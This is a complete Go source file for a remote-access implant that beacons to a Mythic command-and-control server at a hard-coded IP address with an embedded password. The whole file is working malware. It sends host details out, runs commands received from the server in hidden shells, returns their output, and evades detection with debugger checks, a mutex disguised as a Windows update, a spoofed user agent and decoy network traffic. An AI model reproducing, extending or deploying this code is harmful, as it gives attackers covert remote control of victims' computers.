package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "math/rand"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "syscall"
        "time"
        "unsafe"
)

const (
        mythicURL = "https://37.27.249.191:7443"
        mythicPwd = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
        userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        mutexName = "Global\\WinUpdate32"
)

var (
        kernel32 = syscall.NewLazyDLL("kernel32.dll")
        user32   = syscall.NewLazyDLL("user32.dll")
        
        procIsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
        procGetCursorPos      = user32.NewProc("GetCursorPos")
        procCreateMutexW      = kernel32.NewProc("CreateMutexW")
)

type AgentCheckin struct {
        Action    string                 `json:"action"`
        UUID      string                 `json:"uuid"`
        User      string                 `json:"user"`
        Host      string                 `json:"host"`
        PID       int                    `json:"pid"`
        OS        string                 `json:"os"`
        Timestamp string                 `json:"timestamp"`
        IPs       []string               `json:"ips"`
        Payload   map[string]interface{} `json:"payload_os"`
}

type AgentResponse struct {
        Action     string `json:"action"`
        TaskID     string `json:"task_id"`
        UserOutput string `json:"user_output"`
        Completed  bool   `json:"completed"`
}

type MousePoint struct {
        X, Y int32
}

func DetectDebugger() bool {
        if runtime.GOOS != "windows" {
                return false
        }
        
        ret, _, _ := procIsDebuggerPresent.Call()
        return ret != 0
}

func CheckMouse() bool {
        var pos1, pos2 MousePoint
        
        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
        time.Sleep(100 * time.Millisecond)
        procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
        
        return pos1.X != pos2.X || pos1.Y != pos2.Y
}

func RegisterAgent() error {
        hostname, _ := os.Hostname()
        uuid := fmt.Sprintf("%d-%s", time.Now().Unix(), hostname)
        
        payload := AgentCheckin{
                Action:    "checkin",
                UUID:      uuid,
                User:      os.Getenv("USERNAME"),
                Host:      hostname,
                PID:       os.Getpid(),
                OS:        runtime.GOOS,
                Timestamp: time.Now().Format(time.RFC3339),
                IPs:       []string{"127.0.0.1"},
                Payload: map[string]interface{}{
                        "os":   runtime.GOOS,
                        "arch": runtime.GOARCH,
                },
        }
        
        jsonData, err := json.Marshal(payload)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", userAgent)
        req.Header.Set("Mythic", mythicPwd)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

func GetTasks() ([]map[string]interface{}, error) {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("GET", mythicURL+"/api/v1.4/agent_message", nil)
        if err != nil {
                return nil, err
        }
        
        req.Header.Set("User-Agent", userAgent)
        req.Header.Set("Mythic", mythicPwd)
        
        resp, err := client.Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }
        
        var tasks []map[string]interface{}
        json.Unmarshal(body, &tasks)
        
        return tasks, nil
}

func ExecuteCommand(command string) string {
        var cmd *exec.Cmd
        
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/c", command)
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        } else {
                cmd = exec.Command("sh", "-c", command)
        }
        
        output, err := cmd.Output()
        if err != nil {
                return fmt.Sprintf("Error: %s", err.Error())
        }
        
        return string(output)
}

func SendResult(taskID, output string) error {
        response := AgentResponse{
                Action:     "post_response",
                TaskID:     taskID,
                UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
                Completed:  true,
        }
        
        jsonData, err := json.Marshal(response)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", userAgent)
        req.Header.Set("Mythic", mythicPwd)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

func DoLegitActivity() {
        go func() {
                rand.Seed(time.Now().UnixNano())
                
                for {
                        time.Sleep(time.Duration(300+rand.Intn(300)) * time.Second)
                        
                        activities := []func(){
                                func() {
                                        cmd := exec.Command("nslookup", "microsoft.com")
                                        if runtime.GOOS == "windows" {
                                                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                                        }
                                        cmd.Run()
                                },
                                func() {
                                        cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
                                        if runtime.GOOS == "windows" {
                                                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                                        }
                                        cmd.Run()
                                },
                        }
                        
                        if len(activities) > 0 {
                                activities[rand.Intn(len(activities))]()
                        }
                }
        }()
}

func main() {
        // Evasão básica
        if DetectDebugger() {
                os.Exit(0)
        }
        
        // Mutex
        if runtime.GOOS == "windows" {
                mutexNamePtr, _ := syscall.UTF16PtrFromString(mutexName)
                mutex, _, _ := procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
                if mutex == 0 {
                        os.Exit(0)
                }
        }
        
        // Atividades de legitimidade
        DoLegitActivity()
        
        // Delay inicial
        time.Sleep(time.Duration(10+rand.Intn(20)) * time.Second)
        
        // Registro
        err := RegisterAgent()
        if err != nil {
                time.Sleep(30 * time.Second)
                os.Exit(0)
        }
        
        // Loop principal
        rand.Seed(time.Now().UnixNano())
        
        for {
                tasks, err := GetTasks()
                if err == nil && len(tasks) > 0 {
                        for _, task := range tasks {
                                if taskID, ok := task["id"].(string); ok {
                                        if command, ok := task["command"].(string); ok {
                                                output := ExecuteCommand(command)
                                                SendResult(taskID, output)
                                        }
                                }
                        }
                }
                
                // Jitter simples
                jitter := time.Duration(5+rand.Intn(10)) * time.Second
                time.Sleep(jitter)
        }
}